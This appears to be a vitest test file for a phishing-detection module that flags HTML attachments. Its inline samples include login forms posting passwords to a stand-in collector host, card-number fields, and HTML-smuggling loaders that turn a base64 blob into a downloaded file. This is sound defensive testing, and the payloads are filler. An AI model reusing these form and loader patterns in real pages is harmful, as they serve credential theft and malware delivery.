import { env } from "cloudflare:workers";
import { describe, expect, it } from "vitest";
import type { CaseView } from "../../src/checks/case-view";
import { readEvidence } from "../../src/checks/evidence";
import {
  analyseHtml,
  decodeHtml,
  type HtmlFeatures,
  htmlAttachmentEvidence,
  htmlAttachmentsOf,
  LONG_BASE64,
  MAX_HTML_ATTACHMENTS,
  MAX_HTML_BYTES,
} from "../../src/checks/html-attachment";
import { createCase } from "../../src/db/cases";
import { parsedKey, putAttachment, putParsed, putRaw, type Store } from "../../src/intake/store";
import { checks } from "../../src/pipeline/analysis-workflow";
import { cardPage, iconOnly, loader, loginPage, receipt } from "../fixtures/attachments/html";

// D02 T04 §2: HTML and SVG attachments, a local login page and a smuggling loader high, any other medium.
describe("analyseHtml", () => {
  it("finds a login page's password field and its off-site form", async () => {
    expect(await analyseHtml(loginPage)).toMatchObject({
      passwordField: true,
      formActions: ["https://collector.example/post"],
      smuggling: false,
    });
  });

  it("finds a card field", async () => {
    expect(await analyseHtml(cardPage)).toMatchObject({ cardField: true, formActions: [] });
  });

  it("finds a smuggling loader: a long payload, a construction and a download", async () => {
    expect(await analyseHtml(loader)).toMatchObject({
      longBase64: true,
      builds: true,
      downloads: true,
      smuggling: true,
    });
  });

  it("finds nothing in a receipt, and no loader in a long inline icon alone", async () => {
    expect(await analyseHtml(receipt)).toMatchObject({
      passwordField: false,
      cardField: false,
      formActions: [],
      smuggling: false,
    });
    // A large inline image is no payload: only script or a download link's own data counts.
    expect(await analyseHtml(iconOnly)).toMatchObject({ longBase64: false, smuggling: false });
  });
});

describe("analyseHtml's branches (plan review)", () => {
  it("raises on an off-site form alone, and on a card field alone", async () => {
    expect(await analyseHtml(`<form action="https://x.example/c"><input name="q"></form>`)).toMatchObject({
      formActions: ["https://x.example/c"],
      passwordField: false,
    });
    expect(htmlAttachmentEvidence(viewOf({ cardField: true }))[0]?.severity).toBe("high");
    expect(htmlAttachmentEvidence(viewOf({ formActions: ["https://x.example/c"] }))[0]?.severity).toBe("high");
  });

  it("finds a loader in an SVG's script and in a link that downloads its own data", async () => {
    expect(
      (
        await analyseHtml(
          `<svg xmlns="http://www.w3.org/2000/svg"><script>${loaderScript(LONG_BASE64 + 4)}</script></svg>`,
        )
      ).smuggling,
    ).toBe(true);
    expect(
      (
        await analyseHtml(
          `<a download="i.iso" href="data:application/octet-stream;base64,${"A".repeat(LONG_BASE64 + 4)}">x</a>`,
        )
      ).smuggling,
    ).toBe(true);
  });

  it("is no loader with any one part missing, nor at exactly 10 KiB", async () => {
    const payload = "A".repeat(LONG_BASE64 + 4);
    const cases = [
      `<script>var b="${payload}"; a.download="x"; a.click();</script>`,
      `<script>var b="${payload}"; var u = URL.createObjectURL(new Blob([atob(b)]));</script>`,
      `<script>var b="short"; var u = URL.createObjectURL(new Blob([atob(b)])); a.download = "x"; a.click();</script>`,
      `<script>${loaderScript(LONG_BASE64 - 4)}</script>`,
      `<a download="x" href="data:application/octet-stream;base64,${"A".repeat(LONG_BASE64)}">x</a>`,
      `<a href="data:application/octet-stream;base64,${payload}">no download attribute</a>`,
    ];
    for (const html of cases) expect((await analyseHtml(html)).smuggling, html.slice(0, 80)).toBe(false);
  });
});

const loaderScript = (bytes: number) =>
  `var b="${"A".repeat(bytes)}"; var u = URL.createObjectURL(new Blob([atob(b)])); var a = document.createElement("a"); a.href = u; a.download = "x.iso"; a.click();`;
function viewOf(features: Partial<HtmlFeatures>): CaseView {
  return {
    htmlAttachments: {
      items: [
        {
          key: "attachments/x/a",
          filename: "a.html",
          kind: "html",
          features: {
            passwordField: false,
            cardField: false,
            formActions: [],
            longBase64: false,
            builds: false,
            downloads: false,
            smuggling: false,
            smugglingBy: null,
            truncated: false,
            ...features,
          },
        },
      ],
      unread: 0,
    },
  } as unknown as CaseView;
}

const store: Store = { bucket: env.ARTEFACTS, db: env.DB };
async function caseWith(files: [string, string, string][]) {
  const made = await createCase(env.DB, { orgId: "org-html", channel: "email", headersAvailable: true });
  if (!made.ok) throw new Error(made.error.message);
  const id = made.value.id;
  await putRaw(store, id, new TextEncoder().encode("From: x@y.example\r\n\r\nSee attached.\r\n"));
  const attachments = [];
  for (const [filename, mediaType, body] of files) {
    const bytes = new TextEncoder().encode(body);
    const stored = await putAttachment(store, id, filename, bytes, mediaType);
    attachments.push({
      key: stored.key,
      filename,
      mediaType,
      contentId: null,
      disposition: "attachment",
      bytes: bytes.length,
    });
  }
  await putParsed(store, id, {
    headers: [],
    text: "See attached.",
    html: null,
    attachments,
    truncated: [],
    omitted: 0,
    forward: { path: "rfc822", headersAvailable: true, otherOriginals: 0 },
  });
  return id;
}
const run = (id: string) => checks(store, id, parsedKey(id), { orgId: "org-html", channel: "email" }, async () => []);
const items = async (id: string) => (await readEvidence(env.DB, id)).filter((e) => e.check === "attachment.html");

describe("after the completion review", () => {
  it("finds a card field named by its label, by `for` or by wrapping", async () => {
    expect((await analyseHtml(`<label for="n">Card number</label><input id="n">`)).cardField).toBe(true);
    expect((await analyseHtml(`<label>Expiry date <input name="x1"></label>`)).cardField).toBe(true);
    expect((await analyseHtml(`<label>Your name <input name="x2"></label>`)).cardField).toBe(false);
  });

  it("reads a page declaring UTF-16, or a commented declaration, as a browser would", () => {
    const page = '<meta charset="utf-16"><input type="password">';
    expect(decodeHtml(new TextEncoder().encode(page))).toContain('type="password"');
    expect(decodeHtml(new TextEncoder().encode(`<!-- <meta charset="utf-16"> -->${page.slice(22)}`))).toContain(
      'type="password"',
    );
  });

  it("finds a loader whose navigation sits far from its object URL", async () => {
    const script = `var b="${"A".repeat(LONG_BASE64 + 4)}"; var u = URL.createObjectURL(new Blob([atob(b)]));${" ".repeat(2_000)}location.href = u;`;
    expect((await analyseHtml(`<script>${script}</script>`)).smuggling).toBe(true);
  });

  it("describes a downloading data link as a link, and says when a high finding was read in part", () => {
    const link = htmlAttachmentEvidence(viewOf({ smuggling: true, smugglingBy: "link" }))[0];
    expect(link?.summary).toContain("a link that downloads a file hidden inside the page");
    expect(link?.summary).not.toContain("script");
    const big = htmlAttachmentEvidence(viewOf({ passwordField: true, truncated: true }))[0];
    expect(big).toMatchObject({ severity: "high" });
    expect(big?.summary).toContain("only its first 5 MB were read");
  });
});

describe("after round 1", () => {
  it("decodes character references in the attributes it reads", async () => {
    const f = await analyseHtml(
      `<form action="https&#58;//collector.example/post"><input type="pass&#119;ord"></form>`,
    );
    expect(f).toMatchObject({ passwordField: true, formActions: ["https://collector.example/post"] });
  });

  it("reads a label left open at the end of the document", async () => {
    expect((await analyseHtml(`<label>Card number <input id="n">`)).cardField).toBe(true);
  });

  it("reads UTF-16 aliases as UTF-8, as browsers do", () => {
    for (const label of ["unicode", "csUnicode", "iso-10646-ucs-2", "unicodeFFFE", "utf-16be"])
      expect(decodeHtml(new TextEncoder().encode(`<meta charset="${label}"><input type="password">`)), label).toContain(
        'type="password"',
      );
  });

  it("finds a loader that sets the download with setAttribute and clicks a data link", async () => {
    const script = `const a = document.createElement("a"); a.href = "data:application/octet-stream;base64,${"A".repeat(12_000)}"; a.setAttribute("download", "invoice.bin"); a.click();`;
    expect(await analyseHtml(`<script>${script}</script>`)).toMatchObject({ downloads: true, smuggling: true });
  });
});

describe("after round 2", () => {
  it("decodes a numeric reference without its semicolon, as browsers do", async () => {
    expect((await analyseHtml(`<input type="pass&#119ord">`)).passwordField).toBe(true);
    expect((await analyseHtml(`<input type="pass&#x77ord">`)).passwordField).toBe(true);
  });

  it("reads a cc- token after the section and billing tokens", async () => {
    for (const ac of ["billing cc-exp", "section-pay billing cc-csc", "shipping cc-number"])
      expect((await analyseHtml(`<input name="x" autocomplete="${ac}">`)).cardField, ac).toBe(true);
    expect((await analyseHtml(`<input name="x" autocomplete="billing email">`)).cardField).toBe(false);
  });
});

describe("attachment.html through the checks step", () => {
  it("stores a login page and a loader as high, a receipt as medium, citing each attachment", async () => {
    const id = await caseWith([
      ["signin.html", "text/html", loginPage],
      ["invoice.htm", "application/octet-stream", loader],
      ["receipt.html", "text/html", receipt],
      ["notes.txt", "text/plain", "Plain notes"],
    ]);
    await run(id);
    const stored = await items(id);
    expect(stored.map((i) => [i.detail.filename, i.severity])).toEqual([
      ["signin.html", "high"],
      ["invoice.htm", "high"],
      ["receipt.html", "medium"],
    ]);
    expect(stored[1]?.summary).toContain("builds a file from a hidden payload and downloads it");
    for (const item of stored)
      expect(item.artefacts).toEqual([expect.stringMatching(/^raw\/[0-9A-Z]{26}\/attachments\//)]);
    expect(new Set(stored.map((i) => i.artefacts[0])).size).toBe(3);
  });

  it("finds an HTML attachment by its bytes, its extension or its declared type", async () => {
    for (const [filename, mediaType, body] of [
      ["scan.pdf", "application/pdf", loginPage],
      ["page.htm", "application/octet-stream", "not html at all, by its bytes"],
      ["page", "text/html", "not html at all, by its bytes"],
      ["logo.svg", "application/octet-stream", "plain words"],
    ] as const) {
      const id = await caseWith([[filename, mediaType, body]]);
      await run(id);
      expect((await items(id)).length, filename).toBe(1);
    }
  });

  it("reads a windows-1252 page with or without its declaration, and marks a file past 5 MB as read in part", async () => {
    const latin = (text: string) => Uint8Array.from(text, (c) => c.charCodeAt(0));
    expect(decodeHtml(latin('<meta charset="windows-1252"><p>Caf\u00e9</p>'))).toContain("Caf\u00e9");
    expect(decodeHtml(latin("<p>Caf\u00e9</p>"))).toContain("Caf\u00e9");
    expect(decodeHtml(new TextEncoder().encode("<p>Caf\u00e9</p>"))).toContain("Caf\u00e9");
    // A password field past the cut is never read: the range read stops at MAX_HTML_BYTES.
    const id = await caseWith([
      ["big.html", "text/html", `${receipt}${" ".repeat(MAX_HTML_BYTES)}<input type="password">`],
    ]);
    await run(id);
    expect((await items(id))[0]).toMatchObject({ severity: "medium", detail: { truncated: true } });
  });

  it("counts a missing object as not read", async () => {
    const view = {
      attachments: [
        {
          key: "attachments/none/gone",
          filename: "a.html",
          mediaType: "text/html",
          contentId: null,
          disposition: null,
          bytes: 1,
        },
      ],
      attachmentHeads: null,
    } as unknown as Pick<CaseView, "attachments" | "attachmentHeads">;
    expect(await htmlAttachmentsOf(env.ARTEFACTS, view)).toEqual({ items: [], unread: 1 });
  });

  it("reads at most MAX_HTML_ATTACHMENTS and counts the rest", async () => {
    const id = await caseWith(
      Array.from({ length: MAX_HTML_ATTACHMENTS + 2 }, (_, i) => [
        `r${i}.html`,
        "text/html",
        `${receipt}<!-- ${i} -->`,
      ]),
    );
    await run(id);
    const stored = await items(id);
    expect(stored.filter((i) => i.severity === "medium")).toHaveLength(MAX_HTML_ATTACHMENTS);
    expect(stored.find((i) => i.severity === "info")?.detail).toMatchObject({ checked: false, unread: 2 });
  });

  it("throws on a storage error, so the step is retried", async () => {
    const view = {
      attachments: [
        {
          key: "attachments/x/a",
          filename: "a.html",
          mediaType: "text/html",
          contentId: null,
          disposition: null,
          bytes: 1,
        },
      ],
      attachmentHeads: null,
    } as unknown as Pick<CaseView, "attachments" | "attachmentHeads">;
    const broken = { get: async () => Promise.reject(new Error("R2 down")) } as unknown as R2Bucket;
    await expect(htmlAttachmentsOf(broken, view)).rejects.toThrow("R2 down");
  });

  it("says nothing without HTML attachments", () => {
    expect(htmlAttachmentEvidence({ htmlAttachments: null } as unknown as CaseView)).toEqual([]);
  });
});
